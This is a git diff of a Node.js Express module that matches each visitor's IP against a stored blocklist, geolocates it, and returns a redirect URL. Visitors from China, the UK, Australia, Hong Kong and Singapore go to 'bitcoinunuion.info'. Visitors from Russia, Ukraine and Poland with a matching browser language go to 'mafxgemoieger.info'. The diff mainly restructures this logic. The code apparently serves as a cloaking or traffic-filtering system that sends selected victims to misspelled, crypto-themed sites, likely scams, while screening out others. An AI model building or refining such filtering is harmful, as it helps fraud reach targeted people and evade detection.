@@ -24,12 +24,7 @@ module.exports.getUrl = async function (req, res) {
         }
         const allBlackIp = await Ip.find({})
         const block = parceIpForCompare(ip, allBlackIp);
-        let date = new Date(Date.now()).getFullYear() + '-' +
-            ("0" + (new Date(Date.now()).getMonth() + 1)).slice(-2) + '-' +
-            ("0" + (new Date(Date.now()).getDate())).slice(-2) + ' ' +
-            ("0" + new Date(Date.now()).getHours()).slice(-2) + ':' +
-            ("0" + new Date(Date.now()).getMinutes()).slice(-2) + ':' +
-            ("0" + new Date(Date.now()).getSeconds()).slice(-2);
+        let date = new Date(Date.now()).toString();
 
         if (block) {
             const user = new User({
@@ -95,48 +90,30 @@ function checkCountry(ip, language) {
     } else {
         countryCode = geo.country;
         city = geo.city;
-        switch (geo.country) {
-            case "CN":
-                url = 'bitcoinunuion.info'
-                break
-            case "UK":
-                url = 'bitcoinunuion.info'
-                break
-            case "AU":
-                url = 'bitcoinunuion.info'
-                break
-            case "HK":
-                url = 'bitcoinunuion.info'
-                break
-            case "SG":
-                url = 'bitcoinunuion.info'
-                break
-            // case "PL":
-            //     url = 'mafxgemoieger.info'
-            //     break
-            // case "RU":
-            //     url = 'mafxgemoieger.info'
-            //     break
-            // case "UA":
-            //     url = 'mafxgemoieger.info'
-            //     break
-            default:
-                url = null;
-                break
+
+        if (countryCode === "CN" ||
+            countryCode === "SG" || countryCode === "AU" ||
+            countryCode === "UK" || countryCode === "HK") {
+            url = 'bitcoinunuion.info'
+        } else if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
+            if (language.toUpperCase() ==='RU' ||
+                language.toUpperCase() ==='UA' ||
+                language.toUpperCase() ==='RU-UA' ||
+                language.toUpperCase() ==='PL') {
+                url = 'mafxgemoieger.info'
+            } else {
+                reason = 'Invalid language'
+                url = null
+            }
+        } else {
+            url = null;
+            reason = 'Invalid country'
+
         }
 
     }
-    if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
-        if (language.toUpperCase() ==='RU' ||
-            language.toUpperCase() ==='UA' ||
-            language.toUpperCase() ==='RU-UA' ||
-            language.toUpperCase() ==='PL') {
-            url = 'mafxgemoieger.info'
-            } else {
-            reason = 'Invalid language'
-            url = null
-        }
-    }
+
+
 
     return {url, countryCode, city, reason}
 }
